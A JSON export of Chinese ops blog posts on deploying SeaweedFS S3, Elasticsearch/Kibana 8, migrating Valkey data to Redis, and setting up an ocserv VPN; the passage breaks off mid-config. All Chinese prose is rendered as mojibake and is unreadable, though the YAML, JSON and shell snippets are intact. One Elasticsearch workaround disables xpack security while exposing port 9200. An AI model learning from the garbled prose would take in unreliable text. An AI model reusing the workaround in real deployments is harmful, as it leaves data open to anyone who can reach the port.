[{"categories":null,"content":"å…¬å¸è¦åšç³»ç»Ÿè¿ç§»ï¼Œä»AWSè¿ç§»åˆ°è‡ªå»ºæœºæˆ¿ï¼Œé‚£è¿ç§»çš„é¡¹ç›®å°±ä¸€å¤§å †ï¼ŒS3ä¹Ÿåœ¨å…¶ä¸­ä¹‹åˆ—ã€‚\næ‰¾æ¥æ‰¾å»ï¼Œç¬¬ä¸€é¦–é€‰çš„æ›¿ä»£è½¯ä»¶æ˜¯minioï¼Œå¯æ˜¯ä¸‡æ¶çš„minioå›¢é˜Ÿåœ¨è¿™ä¸ªæ—¶é—´ç‚¹ï¼Œå·²ç»åå°ç§»é™¤äº† admin ç›¸å…³çš„æ“ä½œæƒé™\nè¦æƒ³ç”¨å‘¢ï¼Œåªèƒ½ç”¨ä¸ªè€ç‰ˆæœ¬çš„ï¼šquay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z é‚£åªèƒ½å†æ‰¾äº†ï¼Œäºæ˜¯æ‰¾åˆ°äº†SeaweedFSï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸ªå½»å¤´å½»å°¾çš„å•æ–‡ä»¶ï¼Œä½†æ˜¯åˆ†å¸ƒå¼å…¨é›†ç¾¤æ¶æ„\nç®€å•çš„è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªè½¯ä»¶ï¼ŒåŒ…å«äº†10å‡ ç§åŠŸèƒ½ã€‚\nè€Œæˆ‘ä»¬å‘¢ï¼Œå…¶å®å°±è¦å®ƒçš„ä¸€ä¸ªåŠŸèƒ½s3ï¼Œè€Œä¸”è¦ç”¨äºç”Ÿäº§ã€‚ç½‘ä¸Šä¸€å¤§å †çš„æ•™ç¨‹éƒ½æ˜¯å„ç§åˆ†å¸ƒå¼çš„éƒ¨ç½²ï¼Œå¦‚æœæœºå™¨è¶³å¤Ÿï¼Œå¤§å®¶å¯ä»¥å‚è€ƒç½‘ä¸Šæ•™ç¨‹ã€‚\næˆ‘ä»¬å•å°æœºå™¨ï¼Œç¡¬ç›˜åº•å±‚æ˜¯raid10ï¼Œç„¶åä¸Šå±‚å°±åªæä¾›s3ï¼Œè€Œä¸”è¦é…ç½®ç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Œè¿™å°æœºå™¨æ˜¯ç›´æ¥æš´éœ²å…¬ç½‘IPçš„ã€‚\né‚£æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯Docker composeï¼Œè€Œä¸”åªæ”¾å¼€s3çš„æŒ‡å®šç«¯å£ï¼š\n1services: 2 seaweedfs-s3: 3 image: chrislusf/seaweedfs 4 container_name: seaweedfs-s3 5 volumes: 6 - ./data:/data 7 - ./config/config.json:/seaweedfs/config.json 8 ports: 9 - \u0026#34;127.0.0.1:8333:8333\u0026#34; 10 # - \u0026#34;9333:9333\u0026#34; 11 entrypoint: /bin/sh -c 12 command: | 13 \u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\ 14 weed server -dir=/data -volume.max=120 -s3 -s3.config /seaweedfs/config.json\u0026#34; 15 restart: unless-stopped ä»”ç»†è§£é‡Šä¸Šé¢çš„å‚æ•°ï¼š\nports åªå¼€äº† 127.0.0.1:8333 çš„S3ç«¯å£ï¼Œå…¶å®ƒéƒ½ä¸å¼€ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼Œå¯ä»¥ä¸´æ—¶æ‰“å¼€9333ç«¯å£æŸ¥çœ‹ï¼Œçœ‹å®Œå†å…³ -volume.max=120ï¼Œè¿™ä¸ªåŠ¡å¿…è¦æ³¨æ„ï¼Œseaweedæ˜¯åˆ†å·çš„ï¼Œä¸€ä¸ªå·æœ€å¤š30Gï¼Œç¼ºçœæ˜¯8ä¸ªå·ã€‚é‚£ç¼ºçœå°±æ˜¯åªæœ‰240Gçš„å®¹é‡ï¼Œæˆ‘ä»¬çš„ç¡¬ç›˜æ˜¯4Tçš„ï¼Œå‰©ä½™3.7TBï¼Œé‚£ç®—ä¸‹æ¥ï¼Œ30*120=3600G=3.6Tã€‚è¿™æ ·å°±å¯¹å‡†äº†ï¼Œè¿™ä¸ªå‚æ•°ä¸€å®šè¦æ ¹æ®ç”Ÿäº§çš„å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´. å¦å¤–è¿˜æŠŠconfig.jsonçš„é…ç½®æ–‡ä»¶ç»™mountå…¥dockerå·ä¸­äº†ï¼Œé…ç½®æ–‡ä»¶é‡Œæ”¾çš„å°±æ˜¯S3çš„IAMè®¿é—®æƒé™æ§åˆ¶ è¯¦ç»†çœ‹ä¸€ä¸‹config.json\n1{ 2 \u0026#34;identities\u0026#34;: [ 3 { 4 \u0026#34;name\u0026#34;: \u0026#34;admin\u0026#34;, 5 \u0026#34;credentials\u0026#34;: [ 6 { 7 \u0026#34;accessKey\u0026#34;: \u0026#34;aaa\u0026#34;, 8 \u0026#34;secretKey\u0026#34;: \u0026#34;bbb\u0026#34; 9 } 10 ], 11 \u0026#34;actions\u0026#34;: [ 12 \u0026#34;Admin\u0026#34;, 13 \u0026#34;Read\u0026#34;, 14 \u0026#34;List\u0026#34;, 15 \u0026#34;Tagging\u0026#34;, 16 \u0026#34;Write\u0026#34; 17 ] 18 }, 19 { 20 \u0026#34;name\u0026#34;: \u0026#34;goods\u0026#34;, 21 \u0026#34;credentials\u0026#34;: [ 22 { 23 \u0026#34;accessKey\u0026#34;: \u0026#34;ccc\u0026#34;, 24 \u0026#34;secretKey\u0026#34;: \u0026#34;ddd\u0026#34; 25 } 26 ], 27 \u0026#34;actions\u0026#34;: [ 28 \u0026#34;Read:goods\u0026#34;, 29 \u0026#34;Write:goods\u0026#34;, 30 \u0026#34;List:goods\u0026#34;, 31 \u0026#34;Tagging:goods\u0026#34;, 32 \u0026#34;Admin:goods\u0026#34; 33 ] 34 } 35 ] 36} è§£é‡Šä¸€ä¸‹ï¼Œä¸Šé¢å®šä¹‰äº†ä¸€ä¸ªadminç”¨æˆ·ï¼Œå¯ä»¥å¯¹æ‰€æœ‰s3è¿›è¡Œè¯»å†™å’Œç®¡ç†ã€‚\nç„¶ååˆå®šä¹‰äº†ä¸€ä¸ªgoodsç”¨æˆ·ï¼Œå®ƒåªå¯¹goodsæ¡¶æœ‰æƒé™ã€‚\né‚£seaweedçš„æ¡¶å’Œæƒé™å®é™…æ˜¯åˆ†å¼€çš„ï¼Œç®¡ç†çš„æ—¶å€™å¯ä»¥å…ˆå»ºæ¡¶ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶é‡Œå†é…ç½®æƒé™ï¼Œæœ€åé‡è½½docker compose up -då³å¯\nå¤§å®¶è‚¯å®šä¹Ÿæ³¨æ„åˆ°äº†ï¼Œç«¯å£æ˜ å°„åªå¼€äº†127.0.0.1:8333ï¼Œè¿™æ˜¯å› ä¸ºhttpç«¯å£ï¼Œå‰é¢éœ€è¦å¥—ä¸ªhttpsæ‰èƒ½æ”¾åˆ°ç”Ÿäº§ç¯å¢ƒã€‚\né‚£å‰ç½®ä»£ç†httpsï¼Œå°±å¥—ç”¨Caddyå¥½äº†ï¼Œé…ç½®æ–‡ä»¶Caddyfileä¹Ÿå·¨ç®€å•, å°±ä¸‰è¡Œï¼š\n1s3.rendoumi.com { 2 reverse_proxy 127.0.0.1:8333 3} é‚£æˆ‘ä»¬ç®¡ç†çš„æ—¶å€™å°±ç”¨minioçš„å®¢æˆ·ç«¯mcå³å¯\n1mc alias set mys3 https://s3.rendoumi.com aaa bbb 2 3mc ls mys3/goods 4 5mc mb newgoods mys3 6 7mc ls mys3/newgoods æœ€åï¼Œå¦‚æœè¦ä»S3åŒæ­¥æ–‡ä»¶ï¼Œé‚£å°±ç”¨ JuiceFS çš„ juicesync è¿™ä¸ªè½¯ä»¶å³å¯ã€‚\n","date":"2025-09-15","img":"","permalink":"https://rendoumi.com/posts/20250915-seeweed_single_deploy/","series":null,"tags":null,"title":"Seaweed S3æœåŠ¡å•æœºç‰ˆæ­£å¼ç¯å¢ƒçš„éƒ¨ç½²"},{"categories":null,"content":"è¦åœ¨ç”Ÿäº§ç¯å¢ƒå»ºä¸€å¥—Elasticsearch 8.0ï¼Œå•èŠ‚ç‚¹æ­é…Kibanaï¼Œç¡®å®æ˜¯å›°éš¾é‡é‡ï¼Œæ–°ç‰ˆæœ¬éœ€è¦TLSéªŒè¯äº†\nç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ2025å¹´9æœˆ2æ—¥ï¼ŒElasticsearchæœ€æ–°ç‰ˆæœ¬æ˜¯9.0ï¼Œåæ’¤2ä¸ªç‰ˆæœ¬æ˜¯8.18.6\né‚£å°±ç”¨è¿™ä¸ªç‰ˆæœ¬äº†ï¼Œç„¶åæ ¹æ®å®˜æ–¹çš„æ–‡æ¡£ä¼šæŠŠäººæç³Šæ¶‚çš„ã€‚\næ­£ç¡®çš„æ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€å»ºç«‹è‡ªç­¾çš„è¯ä¹¦ å…¶å®å¯ä»¥ç”¨ACMEçš„è¯ä¹¦ï¼Œä½†æ˜¯æ²¡æœ‰äººä¼šä¸‰ä¸ªæœˆå°±å»é‡å¯ä¸€ä¸‹ESçš„å®¹å™¨ï¼Œæ›´æ–°è¯ä¹¦å§ï¼\né‚£åªèƒ½é€‰æ‹©è‡ªå»ºCAï¼Œè‡ªç­¾ä¸€ä¸ªè¯ä¹¦äº†ï¼\nå› ä¸ºæœ‰2ä¸ªpodï¼Œeså’Œkibanaï¼Œæ‰€ä»¥è¦ç­¾ä¸¤å¼ è¯ä¹¦ï¼Œç­¾è¯ä¹¦éšä¾¿ç”¨ESçš„ä¸€ä¸ªç‰ˆæœ¬å°±å¯ä»¥ï¼š\n1wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.1-linux-x86_64.tar.gz 2 3tar -zxf elasticsearch-8.4.1-linux-x86_64.tar.gz 4 5cd elasticsearch-8.4.1/ 6./bin/elasticsearch-certutil ca --pem 7 8# å¾—åˆ°CAè¯ä¹¦ï¼Œæ”¾åœ¨å½“å‰ç›®å½•caç›®å½•ä¸‹ 9unzip elastic-stack-ca.zip 10 11# ç”Ÿæˆç­¾å‘é…ç½®æ–‡ä»¶ 12cat \u0026lt;\u0026lt; EOF \u0026gt;instances.yml 13instances: 14 - name: es01 15 dns: 16 - es01 17 - localhost 18 ip: 19 - 127.0.0.1 20 - name: kibana 21 dns: 22 - kibana 23 - localhost 24 ip: 25 - 127.0.0.1 26EOF 27 28# ç­¾å‘2ä¸ªpodçš„è¯ä¹¦ 29./bin/elasticsearch-certutil cert --ca-cert ca/ca.crt --ca-key ca/ca.key --pem --in instances.yml 30 31# å¾—åˆ°2å¼ è¯ä¹¦å’Œkey 32unzip certificate-bundle.zip 33# ç”Ÿæˆä¸¤ä¸ªç›®å½•ï¼Œes01å’Œkibana 34 35# å‡†å¤‡å¥½è¯ä¹¦ç›®å½• 36mkdir -p /data/elasticsearch/certs 37mv ca es01 kibana /data/elasticsearch/certs 38 39# å‡†å¤‡å¥½æŒä¹…åŒ–å· 40mkdir -p /data/elasticsearch/kibanadata 41mkdir -p /data/elasticsearch/esdata01 äºŒã€é…ç½®docker-compose.yaml 8.18.6ç‰ˆæœ¬çš„docker-compose.yamlæ–‡ä»¶ï¼Œä½äºï¼š/data/elasticsearch/docker-compose.yaml\n1# docker-compose.yaml 2services: 3 es01: 4 container_name: es 5 # The Docker image to use for this service 6 image: docker.elastic.co/elasticsearch/elasticsearch:8.18.6 7 # The volumes to mount into this service 8 volumes: 9 - ./certs:/usr/share/elasticsearch/config/certs 10 - ./esdata01:/usr/share/elasticsearch/data 11 # The ports to expose from this service 12 ports: 13 - 9200:9200 14 # The environment variables to set inside the container 15 environment: 16 - node.name=es01 17 - cluster.name=lancode-cluster 18 - discovery.type=single-node 19 - ELASTIC_PASSWORD=aaaaaaaaaaaa 20 - bootstrap.memory_lock=true 21 - \u0026#34;ES_JAVA_OPTS=-Xms10g -Xmx10g\u0026#34; 22 - xpack.security.enabled=true 23 - xpack.security.http.ssl.enabled=true 24 - xpack.security.http.ssl.key=certs/es01/es01.key 25 - xpack.security.http.ssl.certificate=certs/es01/es01.crt 26 - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt 27 - xpack.security.http.ssl.verification_mode=certificate 28 - xpack.security.transport.ssl.enabled=true 29 - xpack.security.transport.ssl.key=certs/es01/es01.key 30 - xpack.security.transport.ssl.certificate=certs/es01/es01.crt 31 - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt 32 - xpack.security.transport.ssl.verification_mode=certificate 33 - xpack.license.self_generated.type=basic 34 # The memory limit for this service 12g = 1024*1024*1024*12 35 mem_limit: 12884901888 36 # The ulimits to set for this service 37 ulimits: 38 memlock: 39 soft: -1 40 hard: -1 41 # The healthcheck to determine the health of this service 42 healthcheck: 43 test: 44 [ 45 \u0026#34;CMD-SHELL\u0026#34;, 46 \u0026#34;curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q \u0026#39;missing authentication credentials\u0026#39;\u0026#34;, 47 ] 48 interval: 10s 49 timeout: 10s 50 retries: 120 51 # The kibana service represents a Kibana instance 52 kibana: 53 # This service depends on the es01 service 54 depends_on: 55 es01: 56 condition: service_healthy 57 container_name: kibana 58 # The Docker image to use for this service 59 image: docker.elastic.co/kibana/kibana:8.18.6 60 # The volumes to mount into this service 61 volumes: 62 - ./certs:/usr/share/kibana/config/certs 63 - ./kibanadata:/usr/share/kibana/data 64 # The ports to expose from this service 65 ports: 66 - 5601:5601 67 # The environment variables to set inside the container 68 environment: 69 - SERVERNAME=kibana 70 - ELASTICSEARCH_HOSTS=https://es01:9200 71 - ELASTICSEARCH_USERNAME=kibana_system 72 - ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbbb 73 - ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt 74 - xpack.security.audit.enabled=true 75 - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=cccccccccccccccccccccc 76 # The memory limit for this service 2g = 1024*1024*1024*2 77 mem_limit: 2147483648 78 # The healthcheck to determine the health of this service 79 healthcheck: 80 test: 81 [ 82 \u0026#34;CMD-SHELL\u0026#34;, 83 \u0026#34;curl -s -I http://localhost:5601 | grep -q \u0026#39;HTTP/1.1 302 Found\u0026#39;\u0026#34;, 84 ] 85 interval: 10s 86 timeout: 10s 87 retries: 120 æ³¨æ„ä¸Šé¢çš„è®¡ç®—ï¼š\nå†…å­˜ï¼Œç³»ç»Ÿæ˜¯16Gï¼Œ2Gä¿ç•™ï¼Œ2Gç»™kibanaï¼Œ12Gç»™esï¼Œjavaå¯åŠ¨å‚æ•°ç»™10g ELASTIC_PASSWORD=aaaaaaaaaaaa è¿™é‡Œçš„passæ˜¯æŒ‡ESçš„ç‹¬ç«‹ç”¨æˆ·elastic ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbb è¿™é‡Œçš„passæ˜¯æŒ‡éœ€è¦å•ç‹¬ç»™kibanaå¼€çš„ä¸€ä¸ªesç”¨æˆ·kibana_system æœ€åç™»å½•kibanaçš„å¯†ç æ˜¯elasticç”¨æˆ·çš„å¯†ç aaaaaaaaa\nè¿™é‡Œå·®ç‚¹è¢«ç»•ç³Šæ¶‚äº†ï¼ŒESå‡çº§åéœ€è¦å¯ç”¨httpsï¼Œç„¶åä¹Ÿå¤šåŠ äº†ç”¨æˆ·ã€‚kibanaéœ€è¦å•ç‹¬ç”¨ä¸€ä¸ªç”¨æˆ·kibana_systemå»è¿æ¥esï¼Œè€Œeså‘¢ï¼Œä¹Ÿæœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç”¨æˆ·elasticè¿›è¡Œç®¡ç†ã€‚ç™»å½•kibannaå‘¢ï¼Œå®é™…æ˜¯è¦ç”¨elasticè¿™ä¸ªç”¨æˆ·ç™»å½•ã€‚Faintï¼ï¼ï¼\nä¸‰ã€å¯åŠ¨ 1docker compose up -d 2 3# å¯åŠ¨åå¿…ç„¶æŠ¥é”™ï¼Œå› ä¸ºé‡Œé¢åªæœ‰elasticè¿™ä¸ªç”¨æˆ·ï¼Œæ²¡æœ‰kibana_systemç”¨æˆ· 4# è¿›å…¥å®¹å™¨ 5docker exec -it es /bin/bash 6 7# ç”Ÿæˆå¯†ç  8curl -X POST --cacert config/certs/ca/ca.crt -u \u0026#34;elastic:aaaaaaaa\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; https://es01:9200/_security/user/kibana_system/_password -d \u0026#39;{\u0026#34;password\u0026#34;: \u0026#34;bbbbbbbb\u0026#34;}\u0026#39; 9 10# æˆ–è€…è¿™æ ·ä¹Ÿè¡Œ 11docker-compose exec -T es bin/elasticsearch-reset-password --batch --user kibana_system 12Password for the [kibana_system] user successfully reset. 13New value: bbbbbbbb ç„¶åå°±okäº†ï¼Œç™»å½•çš„æ—¶å€™ç”¨elasticçš„å¯†ç ï¼Œä¸è¦ç”¨kibana_systemï¼\nå››ã€é¢˜å¤– æœ€é¬¼ç•œçš„åœ°æ–¹å°±æ˜¯kibana\né‡Œé¢è®¾ç½®çš„ä¸¤ä¸ªé…ç½®é¡¹ELASTICSEARCH_USERNAMEå’ŒELASTICSEARCH_PASSWORDè¿˜æœ‰ELASTICSEARCH_HOSTS, å±…ç„¶æ˜¯ç¯å¢ƒå˜é‡\nè¿›å…¥å®¹å™¨é‡Œçœ‹åˆ°çš„kibana.yamlï¼Œå€’æ•°ç¬¬äºŒè¡Œelasticsearch.hosts æ ¹æœ¬å°±æ˜¯é”™çš„ï¼Œè¯¯å¯¼ç¾¤ä¼—ï¼Œè¿™é‡Œæ˜¯ç¯å¢ƒå˜é‡ä¼˜å…ˆï¼Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ°kibana.yamlä¸­çš„é…ç½®ï¼ï¼ï¼ä¸€å®šè¦æ³¨æ„ã€‚\näº”ã€åè®° æ— è¯­å•Šæ— è¯­ï¼Œå¼„äº†è‡ªç­¾è¯ä¹¦ï¼Œç»“æœåŒäº‹åæ˜ è¿æ¥æŠ¥è¯ä¹¦é”™è¯¯\nç®—äº†ï¼Œç»™ä¸ªä¸è¦è¯ä¹¦çš„é…ç½®docker-compose.yaml\n1services: 2 es01: 3 container_name: es 4 # The Docker image to use for this service 5 image: docker.elastic.co/elasticsearch/elasticsearch:8.18.6 6 # The volumes to mount into this service 7 volumes: 8 - ./certs:/usr/share/elasticsearch/config/certs 9 - ./esdata01:/usr/share/elasticsearch/data 10 # The ports to expose from this service 11 ports: 12 - 9200:9200 13 # The environment variables to set inside the container 14 environment: 15 - node.name=es01 16 - cluster.name=lancode-cluster 17 - discovery.type=single-node 18 - ELASTIC_PASSWORD=aaaaaaaaaaaa 19 - bootstrap.memory_lock=true 20 - \u0026#34;ES_JAVA_OPTS=-Xms10g -Xmx10g\u0026#34; 21 - xpack.security.enabled=false 22 - xpack.license.self_generated.type=basic 23 # The memory limit for this service 12g = 1024*1024*1024*12 24 mem_limit: 12884901888 25 # The ulimits to set for this service 26 ulimits: 27 memlock: 28 soft: -1 29 hard: -1 30 # The healthcheck to determine the health of this service 31 healthcheck: 32 test: 33 [ 34 \u0026#34;CMD-SHELL\u0026#34;, 35 \u0026#34;curl -s -I http://localhost:9200 | grep -q \u0026#39;HTTP/1.1 200 OK\u0026#39;\u0026#34;, 36 ] 37 interval: 10s 38 timeout: 10s 39 retries: 120 40 # The kibana service represents a Kibana instance 41 kibana: 42 # This service depends on the es01 service 43 depends_on: 44 es01: 45 condition: service_healthy 46 container_name: kibana 47 # The Docker image to use for this service 48 image: docker.elastic.co/kibana/kibana:8.18.6 49 # The volumes to mount into this service 50 volumes: 51 - ./certs:/usr/share/kibana/config/certs 52 - ./kibanadata:/usr/share/kibana/data 53 # The ports to expose from this service 54 ports: 55 - 5601:5601 56 # The environment variables to set inside the container 57 environment: 58 - SERVERNAME=kibana 59 - ELASTICSEARCH_HOSTS=http://es01:9200 60 - ELASTICSEARCH_USERNAME=kibana_system 61 - ELASTICSEARCH_PASSWORD=bbbbbbbbbbbbbbb 62 - xpack.security.enabled=false 63 - xpack.security.audit.enabled=true 64 - XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=cccccccccccccccccccccc 65 # The memory limit for this service 2g = 1024*1024*1024*2 66 mem_limit: 2147483648 67 # The healthcheck to determine the health of this service 68 healthcheck: 69 test: 70 [ 71 \u0026#34;CMD-SHELL\u0026#34;, 72 \u0026#34;curl -s -I http://localhost:5601 | grep -q \u0026#39;HTTP/1.1 302 Found\u0026#39;\u0026#34;, 73 ] 74 interval: 10s 75 timeout: 10s 76 retries: 120 åŒºåˆ«åœ¨äº xpack.security.enabled=falseå’Œhealthcheck\n","date":"2025-09-02","img":"","permalink":"https://rendoumi.com/posts/20250902-elasticsearch_single_node_8_setup/","series":null,"tags":null,"title":"ç”Ÿäº§ç¯å¢ƒElasticsearch 8å•èŠ‚ç‚¹Docker-Composeçš„å®‰è£…æ–¹æ³•"},{"categories":null,"content":"è¿™è¿˜çœŸæ˜¯ä¸ªå¤§æ´»ï¼Œè€—è´¹äº†æ•´æ•´ä¸€å¤©çš„æ—¶é—´ã€‚\nç©¶å…¶åŸå› æ ¹æœ¬å°±æ˜¯æ— è®ºAWSæ‰˜ç®¡çš„Valkeyè¿˜æ˜¯ç¤¾åŒºçš„Redis.ioï¼Œéƒ½æ˜¯è¢«é­”æ”¹è¿‡çš„é˜‰å‰²ç‰ˆï¼ŒçœŸæ˜¯æ— è¯­ä»–å¦ˆç»™æ— è¯­å¼€é—¨ï¼Œæ— è¯­åˆ°å®¶äº†ï¼\nè¯´ä¸€ä¸‹è¯¦ç»†çš„è¿‡ç¨‹ï¼š\næ¥åˆ°è¿™ä¸ªä»»åŠ¡ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯åŒæ­¥è½¯ä»¶redis-Gunyu\nhttps://github.com/mgtv-tech/redis-GunYu ç»“æœæ˜¯å¤±è´¥ï¼ŒåŸå› å¾ˆå¥‡è‘©ï¼Œå› ä¸ºaws valkeyæ˜¯å¿…é¡»å¸¦tlsè¿æ¥çš„ï¼ŒGunyuä¸æ”¯æŒï¼Œæ”¾å¼ƒã€‚\nç„¶åæ‰¾åˆ°äº†redis-shake\nhttps://tair-opensource.github.io/RedisShake ç»“æœè¿˜æ˜¯å¤±è´¥ï¼Œç†ç”±æ˜¯ä¸æ”¯æŒPSyncï¼Œç”¨äº†scan_readerä¹Ÿå¤±è´¥\nç„¶åå°±åˆæƒ³åˆ°äº†ä¸‡èƒ½çš„ChatGPTå’ŒGoogleçš„Geminiï¼Œåˆ†åˆ«ç»™äº†2ä¸ªpythonç¨‹åºï¼Œä¹Ÿæ˜¯å¤±è´¥\nåŸå› æ˜¯ä¸æ”¯æŒMigrateå‘½ä»¤ï¼Œè€Œä¸”valkeyæ˜¯åŸºäºredis 7.2æ”¹çš„ï¼Œè€ŒRedis.ioæ˜¯8.0ï¼Œå‘½ä»¤ä¸å…¼å®¹\nèµ°æŠ•æ— è·¯ä¹‹ä¸‹æƒ³åˆ°äº†rdb-toolsï¼Œå…ˆæŠŠvalkeyåšä¸ªå¤‡ä»½ï¼Œæ”¾åˆ°S3æ¡¶é‡Œ\n1valeky-20250819-0001.rdb 2valeky-20250819-0002.rdb 3valeky-20250819-0003.rdb 4valeky-20250819-0004.rdb 5valeky-20250819-0005.rdb 6valeky-20250819-config.json 7 8cat valeky-20250819-config.json 9{ 10 \u0026#34;valeky-20250819/valeky-20250819-0002.rdb\u0026#34; : { 11 \u0026#34;Slots\u0026#34; : \u0026#34;0-5496\u0026#34;, 12 \u0026#34;rdbSize\u0026#34; : \u0026#34;5234516\u0026#34; 13 }, 14 \u0026#34;valeky-20250819/valeky-20250819-0004.rdb\u0026#34; : { 15 \u0026#34;Slots\u0026#34; : \u0026#34;5497-8375\u0026#34;, 16 \u0026#34;rdbSize\u0026#34; : \u0026#34;4340658\u0026#34; 17 }, 18 \u0026#34;valeky-20250819/valeky-20250819-0003.rdb\u0026#34; : { 19 \u0026#34;Slots\u0026#34; : \u0026#34;10082-16383\u0026#34;, 20 \u0026#34;rdbSize\u0026#34; : \u0026#34;5962581\u0026#34; 21 }, 22 \u0026#34;valeky-20250819/valeky-20250819-0001.rdb\u0026#34; : { 23 \u0026#34;Slots\u0026#34; : \u0026#34;8376\u0026#34;, 24 \u0026#34;rdbSize\u0026#34; : \u0026#34;2218\u0026#34; 25 }, 26 \u0026#34;valeky-20250819/valeky-20250819-0005.rdb\u0026#34; : { 27 \u0026#34;Slots\u0026#34; : \u0026#34;8377-10081\u0026#34;, 28 \u0026#34;rdbSize\u0026#34; : \u0026#34;1540505\u0026#34; 29 } 30} çœ‹èµ·æ¥æ˜¯5ä¸ªrdbå¤‡ä»½ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”redisä¸åŒçš„slots\nç”¨rdbæ¥è§£æå¤‡ä»½æ–‡ä»¶ï¼Œç»“æœå¤±è´¥ï¼Œå› ä¸ºä¸è®¤è¯†valkey rdbçš„ç‰ˆæœ¬ã€‚\næ²¡åŠæ³•äº†ï¼Œåˆæ‰¾åˆ°äº†è¿™ä¸ªè½¯ä»¶\nhttps://github.com/HDT3213/rdb ä¸‹è½½åï¼Œé¦–å…ˆæƒ³å¤„ç†æˆjsonæ–‡ä»¶ï¼Œç„¶åçŒå…¥åˆ°redis.io\n1./rdb-linux-amd64 -c json -o 0001.json valeky-20250819-0001.rdb å¤±è´¥ï¼Œå› ä¸ºjsonæ–‡ä»¶çŒå…¥çš„æ—¶å€™redis.ioåˆè¢«é˜‰å‰²äº†ï¼Œå‘½ä»¤ä¸æ”¯æŒ\nèµ°æŠ•æ— è·¯ï¼Œèµ°æŠ•æ— è·¯ï¼Œèµ°æŠ•æ— è·¯å•Šï¼ï¼ï¼æ¬²å“­æ— æ³ªï¼Œæ¬²å“­æ— æ³ªï¼Œæ¬²å“­æ— æ³ªå•Šï¼ï¼ï¼\næ²¡åŠæ³•äº†ï¼Œç”¨redis-shakeæŠŠrdbæ–‡ä»¶é€ä¸ªçŒè¿›å»\n1[rdb_reader] 2filepath = \u0026#34;/root/redis/rdbs/valeky-20250819-0001.rdb\u0026#34; 3 4[redis_writer] 5cluster = false 6address = \u0026#34;redis-22222.c1.ap-southeast-1-1.ec2.redns.redis-cloud.com:22222\u0026#34; 7username = \u0026#34;default\u0026#34; 8password = \u0026#34;ABCDEFG\u0026#34; 9tls = false æ‰§è¡Œäº†5æ¬¡ï¼Œå°±å¯ä»¥äº†ã€‚\nåç»­å•Šï¼šå¯ä»¥å…ˆå»ä¸‹ä¸ªrdt\nhttps://github.com/leonchen83/redis-rdb-cli/ æŠŠ5ä¸ªrdbåˆæˆä¸€ä¸ªï¼Œç„¶åå†çŒå…¥ã€‚\n1./rdt -m ../../valeky-20250819-0001.rdb ../../valeky-20250819-0002.rdb ../../valeky-20250819-0003.rdb ../../valeky-20250819-0004.rdb ../../valeky-20250819-0005.rdb -o all.rdb çœŸçš„æ˜¯ç´¯æ­»äº†ã€‚\n","date":"2025-08-20","img":"","permalink":"https://rendoumi.com/posts/20250820-aws_valkey_to_redis_io/","series":null,"tags":null,"title":"AWSæ‰˜ç®¡çš„Valkeyæ•°æ®è½¬ç§»åˆ°ç¤¾åŒºRedis.ioå»"},{"categories":null,"content":"ç”±äºiosçš„openvpnå¤§é™†åœ°åŒºæ— æ³•å®‰è£…ï¼Œè€Œå‘˜å·¥åˆéœ€è¦æ‰‹æœºæˆ–PCç™»å½•VPNè®¿é—®äº‘ä¸Šçš„èµ„æºï¼Œæ²¡åŠæ³•ï¼Œæ‰¾äº†åˆæ‰¾ï¼Œç»ˆäºï¼Œå‘ç°ciscoçš„vpnè¿˜æ˜¯èƒ½åœ¨è‹¹æœå¸‚åœºä¸‹è½½å®‰è£…çš„ï¼Œé‚£å°±è£…ä¸ªå¼€æºçš„Ocservå§ï¼Œåˆ«è¯´è¿˜æŒºå¥½ï¼Œèƒ½åˆ†ç»„æ§åˆ¶è·¯ç”±çš„å‘å¸ƒï¼Œéå¸¸ä¸é”™\nè®°å½•ä¸€ä¸‹å®‰è£…é…ç½®è¿‡ç¨‹ï¼Œä½¿ç”¨Ubuntu 24.04çš„åº•ç‰ˆï¼š\n1apt update 2apt upgrade 3 4apt-cache show ocserv 5apt-get install -y ocserv 6 7ocserv --version å®‰è£…æ­¥éª¤å°±å¦‚ä¸Šï¼Œéå¸¸ç®€å•ï¼Œè·Ÿopenvpnä¸€æ ·ï¼Œé…ç½®æ–‡ä»¶å°±ä¸€ä¸ª /etc/ocserv/ocserv.conf, ç¼–è¾‘ä¸€ä¸‹ï¼š\n1# è®¤è¯æ–¹å¼ä¸ºç”¨æˆ·åå¯†ç è®¤è¯ 2auth = \u0026#34;plain[passwd=/etc/ocserv/passwd]\u0026#34; 3 4# å¼€æ”¾ç«¯å£ 5tcp-port = 443 6udp-port = 443 7 8# è¯ä¹¦ 9server-cert = /etc/ocserv/_.rendoumi.com.crt 10server-key = /etc/ocserv/_.rendoumi.com.key 11 12# æœ€å¤šç”¨æˆ·æ•° 13max-clients = 1024 14 15# ç»‘å®šåŸŸå 16default-domain = m.rendoumi.com 17 18# åˆ†é…çš„åŠ¨æ€ipæ®µ 19ipv4-network = 10.8.12.0 20ipv4-netmask = 255.255.255.0 21 22# ä¸è·¯ç”± 23no-route = 10.0.0.0/255.0.0.0 24no-route = 172.16.0.0/255.240.0.0 25no-route = 